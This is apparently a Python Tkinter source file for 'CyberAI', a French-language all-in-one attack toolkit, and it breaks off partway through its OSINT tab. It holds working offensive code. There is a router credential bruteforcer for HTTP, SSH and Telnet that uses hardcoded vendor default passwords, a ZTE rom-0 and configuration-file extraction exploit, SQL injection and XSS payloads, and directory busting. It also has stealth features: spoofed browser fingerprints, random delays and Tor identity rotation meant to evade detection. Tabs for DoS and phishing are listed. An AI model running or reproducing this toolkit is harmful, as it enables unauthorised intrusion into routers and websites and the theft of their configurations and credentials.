#!/usr/bin/env python3
import sys
import os
import socket
import ssl
import threading
import time
import json
import subprocess
import random
import string
import requests
import curl_cffi.requests as curl_requests
import whois
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ──────────────────────── CONSTANTES ────────────────────────
DEFAULT_CREDS = {
    "zte": [("admin", "admin"), ("admin", "3UJUh2VemEfUtesEchEC2d2e"), ("admin", "Haikui_V2")],
    "dlink": [("admin", "admin"), ("admin", "")],
    "tplink": [("admin", "admin")],
    "generic": [("admin", "admin"), ("admin", "password"), ("root", "root")],
}

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521,
                2049, 3306, 3389, 5432, 5900, 5901, 5985, 5986, 6379, 8080, 8443, 9090, 27017]

SERVICE_MAP = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
               110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS",
               995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 3306: "MySQL",
               3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
               8443: "HTTPS-Alt", 27017: "MongoDB"}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]

IMPERSONATE_MAP = [
    "chrome124", "chrome124", "chrome124", "safari17_0",
    "firefox133", "firefox133", "firefox133", "chrome124",
    "firefox133", "chrome124", "chrome124", "safari180",
]

STEALTH_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
}


class ProxyManager:
    def __init__(self, app):
        self.app = app
        self.enabled = False
        self.url = ""
        self.username = ""
        self.password = ""

    def apply(self, session):
        if not self.enabled or not self.url:
            return
        if self.username:
            proxy_url = f"{self.url}".replace("://", f"://{self.username}:{self.password}@")
        else:
            proxy_url = self.url
        session.proxies.update({
            "http": proxy_url,
            "https": proxy_url,
        })

    def disable(self, session):
        session.proxies = {}


class StealthSession(curl_requests.Session):
    def __init__(self, app):
        super().__init__()
        self.app = app
        self.request_count = 0
        self.current_impersonate = None

    def request(self, method, url, **kwargs):
        cfg = self.app.stealth
        if cfg.get("enabled"):
            delay = random.uniform(cfg["delay_min"], cfg["delay_max"])
            time.sleep(delay)
            headers = kwargs.setdefault("headers", {})
            idx = random.randrange(len(USER_AGENTS))
            ua = USER_AGENTS[idx]
            imp = IMPERSONATE_MAP[idx]
            if "User-Agent" not in headers:
                headers["User-Agent"] = ua
            for k, v in STEALTH_HEADERS.items():
                headers.setdefault(k, v)
            kwargs["impersonate"] = imp
            self.request_count += 1
            if cfg.get("auto_ip") and self.request_count >= cfg["ip_after"]:
                self.request_count = 0
                threading.Thread(target=self._do_auto_ip, daemon=True).start()
        self.app.proxy.apply(self)
        return super().request(method, url, **kwargs)

    def _do_auto_ip(self):
        try:
            self.app.tor.new_identity()
        except:
            pass


# ──────────────────────── FONCTIONS OUTILS ────────────────────────
def scan_port(ip, port, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False


def get_service_name(port):
    return SERVICE_MAP.get(port, "Inconnu")


def resolve_target(target):
    try:
        return socket.gethostbyname(target)
    except:
        return target


# ──────────────────────── GESTIONNAIRE TOR ────────────────────────
class TorManager:
    def __init__(self, app):
        self.app = app
        self.enabled = False
        self.socks_port = 9050
        self.control_port = 9051
        self.password = ""
        self.current_ip = "Inconnu"
        self.status_text = "D\u00e9sactiv\u00e9"

    def is_tor_running(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(("127.0.0.1", self.socks_port))
            s.close()
            return True
        except:
            return False

    def check_ip(self):
        try:
            proxies = self.app.session.proxies if self.enabled else {}
            r = self.app.session.get("https://api.ipify.org?format=json", proxies=proxies, timeout=8)
            self.current_ip = r.json().get("ip", "Inconnu")
            return self.current_ip
        except:
            self.current_ip = "Erreur"
            return "Erreur"

    def enable(self):
        if not self.is_tor_running():
            return False, "Tor n'est pas en cours d'ex\u00e9cution."
        self.app.session.proxies.update({
            "http": f"socks5h://127.0.0.1:{self.socks_port}",
            "https": f"socks5h://127.0.0.1:{self.socks_port}",
        })
        self.enabled = True
        self.status_text = "Activ\u00e9"
        ip = self.check_ip()
        return True, f"Tor activ\u00e9. IP: {ip}"

    def disable(self):
        self.app.session.proxies = {}
        self.enabled = False
        self.status_text = "D\u00e9sactiv\u00e9"
        self.current_ip = "Inconnu"
        return True, "Tor d\u00e9sactiv\u00e9."

    def new_identity(self):
        try:
            from stem import Signal
            from stem.control import Controller
            with Controller.from_port(port=self.control_port) as ctrl:
                ctrl.authenticate(password=self.password)
                ctrl.signal(Signal.NEWNYM)
            time.sleep(2)
            ip = self.check_ip()
            return True, f"Nouvelle identit\u00e9 Tor: {ip}"
        except ImportError:
            return False, "Module 'stem' non install\u00e9."
        except Exception as e:
            return False, f"Erreur changement d'identit\u00e9: {e}"


# ──────────────────────── FENÊTRE PRINCIPALE ────────────────────────
class CyberAI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CyberAI - Toolkit Cyber Tout-en-Un")
        self.geometry("1000x700")
        self.minsize(900, 600)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook.Tab", padding=[14, 5], font=("TkDefaultFont", 10, "bold"))
        style.configure("TButton", padding=[8, 4], font=("TkDefaultFont", 10))
        style.configure("Success.TLabel", foreground="green", font=("TkDefaultFont", 10, "bold"))
        style.configure("Error.TLabel", foreground="red", font=("TkDefaultFont", 10, "bold"))
        style.configure("Warning.TLabel", foreground="orange", font=("TkDefaultFont", 10))

        self.session = StealthSession(self)
        self.tor = TorManager(self)
        self.proxy = ProxyManager(self)
        self.stealth = {
            "enabled": False,
            "delay_min": 0.5,
            "delay_max": 2.0,
            "auto_ip": False,
            "ip_after": 10,
            "randomize_order": False,
        }

        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True, padx=8, pady=(8, 0))

        self.tabs = {}
        tab_classes = {
            " Réseau ":   NetworkTab,
            " Router ":    RouterTab,
            " Web ":       WebTab,
            " OSINT ":     OSINTTab,
            " Mots de passe ":  PasswordTab,
            " DoS ":       DoSTab,
            " Anonymat " : AnonymityTab,
            " Exploitation "   : ExploitTab,
            " Hameçonnage "  : PhishingTab,
        }

        for name, cls in tab_classes.items():
            frame = ttk.Frame(notebook)
            notebook.add(frame, text=name)
            self.tabs[cls] = cls(frame, self)

        self.status_bar = ttk.Frame(self)
        self.status_bar.pack(fill=tk.X, padx=8, pady=(2, 6))
        self.tor_indicator = ttk.Label(self.status_bar, text="\u25cf Tor: D\u00e9sactiv\u00e9", foreground="gray")
        self.tor_indicator.pack(side=tk.LEFT, padx=5)
        self.ip_indicator = ttk.Label(self.status_bar, text="IP: ---")
        self.ip_indicator.pack(side=tk.LEFT, padx=5)
        self.stealth_indicator = ttk.Label(self.status_bar, text="\u25cf Stealth: OFF", foreground="gray")
        self.stealth_indicator.pack(side=tk.LEFT, padx=5)
        ttk.Label(self.status_bar, text="CyberAI v2.0", foreground="gray").pack(side=tk.RIGHT, padx=5)

        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def update_tor_status(self):
        if self.tor.enabled:
            self.tor_indicator.config(text="\u25cf Tor: Activ\u00e9", foreground="green")
            self.ip_indicator.config(text=f"IP: {self.tor.current_ip}")
        else:
            self.tor_indicator.config(text="\u25cf Tor: D\u00e9sactiv\u00e9", foreground="gray")
            self.ip_indicator.config(text="IP: ---")
        if self.stealth["enabled"]:
            self.stealth_indicator.config(text="\u25cf Stealth: ON", foreground="cyan")
        else:
            self.stealth_indicator.config(text="\u25cf Stealth: OFF", foreground="gray")
        self.update_idletasks()

    def _on_close(self):
        self.destroy()


class BaseTab:
    def __init__(self, parent, app):
        self.parent = parent
        self.app = app

    def log(self, widget, msg, tag=None):
        self.app.after(0, lambda: self._do_log(widget, msg, tag))

    def _do_log(self, widget, msg, tag=None):
        try:
            widget.insert(tk.END, msg + "\n", tag)
            widget.see(tk.END)
        except tk.TclError:
            pass

    def clear(self, widget):
        try:
            widget.delete("1.0", tk.END)
        except tk.TclError:
            pass

    def run_thread(self, target):
        t = threading.Thread(target=target, daemon=True)
        t.start()

    def make_output(self, parent, height=16):
        frame = ttk.Frame(parent)
        frame.pack(fill=tk.BOTH, expand=True)

        btn_bar = ttk.Frame(frame)
        btn_bar.pack(fill=tk.X, pady=(0, 3))
        ttk.Button(btn_bar, text="Effacer", command=lambda: self.clear(txt)).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_bar, text="Sauvegarder", command=lambda: self.save_log(txt)).pack(side=tk.LEFT, padx=2)

        txt = scrolledtext.ScrolledText(frame, height=height, font=("Consolas", 9), state="normal")
        txt.pack(fill=tk.BOTH, expand=True)
        txt.tag_config("success", foreground="green")
        txt.tag_config("error", foreground="red")
        txt.tag_config("warning", foreground="orange")
        txt.tag_config("bold", font=("Consolas", 9, "bold"))
        return txt

    def save_log(self, widget):
        fname = filedialog.asksaveasfilename(defaultextension=".txt",
                                               filetypes=[("Fichiers texte", "*.txt"), ("Tous les fichiers", "*.*")])
        if not fname:
            return
        try:
            content = widget.get("1.0", tk.END)
            with open(fname, "w", encoding="utf-8") as f:
                f.write(content)
            messagebox.showinfo("Exportation", f"Log sauvegardé: {fname}")
        except Exception as e:
            messagebox.showerror("Erreur", f"Impossible de sauvegarder: {e}")


# ════════════════════════ 1. NETWORK SCANNER ════════════════════════
class NetworkTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="Scan de Ports")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="Cible (IP/domaine):").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_target = ttk.Entry(f, width=35, font=("TkDefaultFont", 11))
        self.entry_target.grid(row=0, column=1, padx=5, pady=5)

        self.scan_type = tk.StringVar(value="common")
        ttk.Radiobutton(f, text="Ports courants", variable=self.scan_type, value="common").grid(row=0, column=2, padx=2)
        ttk.Radiobutton(f, text="1-1024", variable=self.scan_type, value="quick").grid(row=0, column=3, padx=2)
        ttk.Radiobutton(f, text="1-65535", variable=self.scan_type, value="full").grid(row=0, column=4, padx=2)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=1, column=0, columnspan=5, pady=5)
        ttk.Button(btn_frame, text="Scan", command=self.run_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Ping", command=self.run_ping).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Mon IP", command=self.run_my_ip).pack(side=tk.LEFT, padx=5)

        mac_frame = ttk.LabelFrame(main, text="Recherche MAC")
        mac_frame.pack(fill=tk.X, pady=(0, 8))
        ttk.Label(mac_frame, text="Adresse MAC:").pack(side=tk.LEFT, padx=5, pady=5)
        self.entry_mac = ttk.Entry(mac_frame, width=20, font=("TkDefaultFont", 11))
        self.entry_mac.pack(side=tk.LEFT, padx=5, pady=5)
        ttk.Button(mac_frame, text="Rechercher", command=self.run_mac_lookup).pack(side=tk.LEFT, padx=5, pady=5)

        self.output = self.make_output(main)

    def run_scan(self):
        self.clear(self.output)
        target = self.entry_target.get().strip()
        if not target:
            messagebox.showwarning("Attention", "Entrez une cible.")
            return
        self.run_thread(lambda: self.do_scan(target))

    def do_scan(self, target):
        ip = resolve_target(target)
        self.log(self.output, f"Cible: {target} \u2192 {ip}", "bold")
        self.log(self.output, f"Scan en cours...\n")

        ports = COMMON_PORTS if self.scan_type.get() == "common" else list(range(1, 1025 if self.scan_type.get() == "quick" else 65536))
        random.shuffle(ports)

        open_ports = []
        def check(p):
            if self.app.stealth.get("enabled"):
                time.sleep(random.uniform(0.1, 0.5))
            if scan_port(ip, p):
                open_ports.append(p)

        with ThreadPoolExecutor(max_workers=100) as pool:
            pool.map(check, ports)

        open_ports.sort()
        if open_ports:
            self.log(self.output, f"{'PORT':>7}  {'SERVICE':<12}  ÉTAT")
            self.log(self.output, "-" * 35)
            for p in open_ports:
                self.log(self.output, f"{p:>7}/TCP  {get_service_name(p):<12}  ouvert", "success")
        else:
            self.log(self.output, "Aucun port ouvert trouvé.", "warning")

    def run_ping(self):
        self.clear(self.output)
        target = self.entry_target.get().strip()
        if not target:
            messagebox.showwarning("Attention", "Entrez une cible.")
            return
        self.run_thread(lambda: self.do_ping(target))

    def do_ping(self, target):
        self.log(self.output, f"Ping {target}...", "bold")
        param = "-n" if os.name == "nt" else "-c"
        result = subprocess.run(["ping", param, "3", target], capture_output=True, text=True, timeout=10)
        self.log(self.output, result.stdout)
        if result.returncode == 0:
            self.log(self.output, "\n\u2713 H\u00f4te joignable", "success")
        else:
            self.log(self.output, "\n\u2717 H\u00f4te injoignable", "error")

    def run_mac_lookup(self):
        self.clear(self.output)
        mac = self.entry_mac.get().strip()
        if not mac:
            messagebox.showwarning("Attention", "Entrez une adresse MAC.")
            return
        self.run_thread(lambda: self.do_mac_lookup(mac))

    def do_mac_lookup(self, mac):
        self.log(self.output, f"Recherche du fabricant pour {mac}...", "bold")
        try:
            r = self.app.session.get(f"https://api.macvendors.com/{mac}", timeout=8)
            if r.status_code == 200:
                self.log(self.output, f"  Fabricant: {r.text.strip()}", "success")
            else:
                self.log(self.output, "  Fabricant non trouv\u00e9.", "warning")
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")

    def run_my_ip(self):
        self.clear(self.output)
        self.run_thread(lambda: self.do_my_ip())

    def do_my_ip(self):
        self.log(self.output, "Recherche de votre IP publique...", "bold")
        try:
            r = self.app.session.get("https://api.ipify.org?format=json", timeout=8)
            ip = r.json().get("ip", "inconnue")
            self.log(self.output, f"  IP publique: {ip}", "success")
            try:
                r2 = self.app.session.get(f"http://ip-api.com/json/{ip}", timeout=8)
                data = r2.json()
                if data.get("status") == "success":
                    self.log(self.output, f"  FAI: {data.get('isp', 'N/A')}")
                    self.log(self.output, f"  Ville: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}")
            except:
                pass
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")


# ════════════════════════ 2. ROUTER EXPLOIT ════════════════════════
class RouterTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="Test Routeur")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="IP:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_ip = ttk.Entry(f, width=20, font=("TkDefaultFont", 11))
        self.entry_ip.grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(f, text="Port:").grid(row=0, column=2, padx=5, pady=5, sticky="w")
        self.entry_port = ttk.Spinbox(f, from_=1, to=65535, width=6, value=80)
        self.entry_port.grid(row=0, column=3, padx=5, pady=5)

        ttk.Label(f, text="Fabricant:").grid(row=0, column=4, padx=5, pady=5, sticky="w")
        self.vendor = tk.StringVar(value="generic")
        ttk.Combobox(f, textvariable=self.vendor, values=list(DEFAULT_CREDS.keys()), width=10, state="readonly").grid(row=0, column=5, padx=5, pady=5)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=1, column=0, columnspan=6, pady=5)
        ttk.Button(btn_frame, text="Scanner Ports", command=self.run_scan_ports).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Bruteforce", command=self.run_bruteforce).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Rom-0 Exploit", command=self.run_rom0).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Extraire Config", command=self.run_config).pack(side=tk.LEFT, padx=3)

        self.output = self.make_output(main)

    def get_ip(self):
        ip = self.entry_ip.get().strip()
        if not ip:
            messagebox.showwarning("Attention", "Entrez une IP.")
            return None
        return ip

    def run_scan_ports(self):
        self.clear(self.output)
        ip = self.get_ip()
        if not ip:
            return
        self.run_thread(lambda: self.do_scan_ports(ip))

    def do_scan_ports(self, ip):
        self.log(self.output, f"Scan des ports sur {ip}...", "bold")
        targets = [22, 23, 80, 443, 8080, 8443]
        random.shuffle(targets)
        open_ports = []
        for p in targets:
            if self.app.stealth.get("enabled"):
                time.sleep(random.uniform(0.2, 0.8))
            if scan_port(ip, p):
                open_ports.append(p)
                self.log(self.output, f"  Port {p} ({get_service_name(p)}) ouvert", "success")
        if not open_ports:
            self.log(self.output, "Aucun port int\u00e9ressant ouvert.", "warning")

    def run_bruteforce(self):
        self.clear(self.output)
        ip = self.get_ip()
        if not ip:
            return
        port = int(self.entry_port.get())
        self.run_thread(lambda: self.do_bruteforce(ip, port))

    def do_bruteforce(self, ip, port):
        vendor = self.vendor.get()
        creds = DEFAULT_CREDS.get(vendor, DEFAULT_CREDS["generic"])
        self.log(self.output, f"Bruteforce {ip}:{port} (fabricant: {vendor})", "bold")
        self.log(self.output, f"Test de {len(creds)} identifiants...\n")

        for user, pwd in creds:
            try:
                if port == 80:
                    r = self.app.session.get(f"http://{ip}:{port}/", auth=(user, pwd), timeout=5, verify=False)
                    if r.status_code == 200:
                        self.log(self.output, f"[HTTP] {user}:{pwd} \u2192 OK", "success")
                elif port == 22:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, port=port, username=user, password=pwd, timeout=5, look_for_keys=False, allow_agent=False)
                    self.log(self.output, f"[SSH] {user}:{pwd} \u2192 OK", "success")
                    ssh.close()
                elif port == 23:
                    import telnetlib
                    tn = telnetlib.Telnet(ip, port, timeout=3)
                    tn.read_until(b"login:", timeout=2)
                    tn.write(user.encode() + b"\n")
                    tn.read_until(b"Password:", timeout=2)
                    tn.write(pwd.encode() + b"\n")
                    out = tn.read_until(b"#", timeout=2)
                    tn.close()
                    if b"#" in out or b"$" in out:
                        self.log(self.output, f"[Telnet] {user}:{pwd} \u2192 OK", "success")
            except:
                pass
        self.log(self.output, "\nBruteforce termin\u00e9.")

    def run_rom0(self):
        self.clear(self.output)
        ip = self.get_ip()
        if not ip:
            return
        port = int(self.entry_port.get())
        self.run_thread(lambda: self.do_rom0(ip, port))

    def do_rom0(self, ip, port):
        self.log(self.output, "T\u00e9l\u00e9chargement rom-0 (ZTE)...", "bold")
        try:
            r = self.app.session.get(f"http://{ip}:{port}/rom-0", timeout=10, verify=False)
            if r.status_code == 200 and len(r.content) > 100:
                fname = f"rom0_{ip}.bin"
                with open(fname, "wb") as f:
                    f.write(r.content)
                self.log(self.output, f"rom-0 t\u00e9l\u00e9charg\u00e9: {fname} ({len(r.content)} octets)", "success")
            else:
                self.log(self.output, "rom-0 non accessible.", "warning")
        except Exception as e:
            self.log(self.output, f"Erreur: {e}", "error")

    def run_config(self):
        self.clear(self.output)
        ip = self.get_ip()
        if not ip:
            return
        port = int(self.entry_port.get())
        self.run_thread(lambda: self.do_config(ip, port))

    def do_config(self, ip, port):
        self.log(self.output, "Extraction configuration ZTE...", "bold")
        urls = [
            "/cgi-bin/DownloadCfg/RouterCfm.cfg",
            "/backupsettings.conf",
            "/config.bin",
        ]
        for path in urls:
            try:
                r = self.app.session.get(f"http://{ip}:{port}{path}", timeout=10, verify=False)
                if r.status_code == 200 and len(r.content) > 50:
                    safe = path.replace("/", "_")
                    fname = f"config_{ip}{safe}"
                    with open(fname, "wb") as f:
                        f.write(r.content)
                    self.log(self.output, f"Config: {path} \u2192 {fname} ({len(r.content)} octets)", "success")
            except:
                pass


# ════════════════════════ 3. WEB TOOLS ════════════════════════
class WebTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="Tests de Sécurité Web")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="URL:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_url = ttk.Entry(f, width=70, font=("TkDefaultFont", 11))
        self.entry_url.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        f.columnconfigure(1, weight=1)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=1, column=0, columnspan=2, pady=5)
        ttk.Button(btn_frame, text="Headers", command=self.run_headers).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="SQLi Test", command=self.run_sqli).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="XSS Test", command=self.run_xss).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Détection Phishing", command=self.run_phishing).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Dir Bust", command=self.run_dirbust).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="SSL Check", command=self.run_ssl).pack(side=tk.LEFT, padx=3)

        self.output = self.make_output(main)

    def get_url(self):
        url = self.entry_url.get().strip()
        if not url:
            messagebox.showwarning("Attention", "Entrez une URL.")
            return None
        if not url.startswith("http"):
            url = "https://" + url
        return url

    def run_headers(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_headers(url))

    def do_headers(self, url):
        self.log(self.output, f"Analyse des headers: {url}", "bold")
        try:
            r = self.app.session.get(url, timeout=10, verify=False)
            self.log(self.output, f"Statut: {r.status_code}", "bold")
            for k, v in r.headers.items():
                tag = None
                if k.lower() in ("server", "x-powered-by"):
                    tag = "warning"
                self.log(self.output, f"  {k}: {v}", tag)
            sec_headers = ["strict-transport-security", "x-frame-options", "x-content-type-options",
                           "content-security-policy", "x-xss-protection"]
            self.log(self.output, "\nS\u00e9curit\u00e9 des headers:", "bold")
            for h in sec_headers:
                if h in {k.lower() for k in r.headers}:
                    self.log(self.output, f"  \u2713 {h}", "success")
                else:
                    self.log(self.output, f"  \u2717 {h} manquant", "error")
        except Exception as e:
            self.log(self.output, f"Erreur: {e}", "error")

    def run_sqli(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_sqli(url))

    def do_sqli(self, url):
        self.log(self.output, f"Test SQLi: {url}", "bold")
        payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--"]
        errors = ["sql", "mysql", "syntax error", "unclosed", "quotation mark", "ODBC", "SQLite"]
        for p in payloads:
            try:
                r = self.app.session.get(url + p, timeout=5, verify=False)
                for e in errors:
                    if e.lower() in r.text.lower():
                        self.log(self.output, f"  [!] Possible SQLi avec: {p}", "error")
                        break
            except:
                pass
        self.log(self.output, "Test SQLi termin\u00e9.")

    def run_xss(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_xss(url))

    def do_xss(self, url):
        self.log(self.output, f"Test XSS: {url}", "bold")
        payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
        for p in payloads:
            try:
                r = self.app.session.get(url + p, timeout=5, verify=False)
                if p in r.text:
                    self.log(self.output, f"  [!] XSS r\u00e9fl\u00e9chie avec: {p[:40]}", "error")
                else:
                    self.log(self.output, f"  - {p[:30]}... non d\u00e9tect\u00e9", "success")
            except:
                pass
        self.log(self.output, "Test XSS termin\u00e9.")

    def run_phishing(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_phishing(url))

    def do_phishing(self, url):
        self.log(self.output, f"D\u00e9tection phishing: {url}", "bold")
        suspicious_words = ["login", "verify", "account", "secure", "update", "confirm", "signin", "bank", "paypal"]
        score = 0
        reasons = []
        if not url.startswith("https"):
            score += 20
            reasons.append("Pas de HTTPS")
        try:
            ip = socket.gethostbyname(url.split("//")[-1].split("/")[0])
            if ip:
                pass
        except:
            score += 15
            reasons.append("Domaine invalide")
        domain = url.split("//")[-1].split("/")[0]
        if domain.count(".") >= 3:
            score += 15
            reasons.append("Multiples sous-domaines")
        for w in suspicious_words:
            if w in url.lower():
                score += 10
                reasons.append(f"Mot suspect: {w}")
        if score >= 30:
            self.log(self.output, f"\u26a0 PHISHING probable ({score}%)", "error")
        elif score >= 15:
            self.log(self.output, f"\u26a0 Suspect ({score}%)", "warning")
        else:
            self.log(self.output, f"\u2713 Semble l\u00e9gitime ({score}%)", "success")
        for r in reasons:
            self.log(self.output, f"  \u2022 {r}")

    def run_dirbust(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_dirbust(url))

    def do_dirbust(self, url):
        self.log(self.output, f"Directory busting: {url}", "bold")
        common = ["admin", "login", "wp-admin", "backup", "config", ".git", ".env",
                  "phpinfo.php", "robots.txt", "sitemap.xml", "api", "uploads", "images"]
        base = url.rstrip("/")
        found = 0
        for d in common:
            try:
                r = self.app.session.get(f"{base}/{d}", timeout=5, verify=False, allow_redirects=False)
                if r.status_code in (200, 301, 302, 403):
                    self.log(self.output, f"  [{r.status_code}] /{d}", "warning" if r.status_code != 403 else "success")
                    found += 1
            except:
                pass
        if found == 0:
            self.log(self.output, "Aucun r\u00e9pertoire sensible trouv\u00e9.", "success")

    def run_ssl(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_ssl(url))

    def do_ssl(self, url):
        import ssl
        host = url.split("//")[-1].split("/")[0].split(":")[0]
        port = 443
        if ":" in url.split("//")[-1].split("/")[0]:
            try:
                port = int(url.split("//")[-1].split("/")[0].split(":")[1])
            except:
                pass
        self.log(self.output, f"Analyse SSL pour {host}:{port}...", "bold")
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((host, port), timeout=8) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    self.log(self.output, f"  Sujet: {dict(cert['subject'][0]).get('commonName', 'N/A')}", "success")
                    self.log(self.output, f"  \u00c9metteur: {dict(cert['issuer'][0]).get('commonName', 'N/A')}")
                    self.log(self.output, f"  Version: TLS {cert.get('version', 'N/A')}")
                    self.log(self.output, f"  D\u00e9but: {cert.get('notBefore', 'N/A')}")
                    self.log(self.output, f"  Expiration: {cert.get('notAfter', 'N/A')}")
                    from datetime import datetime
                    exp = datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                    days = (exp - datetime.now()).days
                    if days < 0:
                        self.log(self.output, f"  \u26a0 Certificat EXPIR\u00c9 (il y a {-days} jours)", "error")
                    elif days < 30:
                        self.log(self.output, f"  \u26a0 Expire dans {days} jours", "warning")
                    else:
                        self.log(self.output, f"  \u2713 Valide encore {days} jours", "success")
                    if 'subjectAltName' in cert:
                        self.log(self.output, f"  SAN: {cert['subjectAltName'][:5]}")
        except Exception as e:
            self.log(self.output, f"  Erreur SSL: {e}", "error")


# ════════════════════════ 4. OSINT ════════════════════════
class OSINTTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="OSINT Reconnaissance")
        f.pack(fill=tk.X, pady=(0, 8))

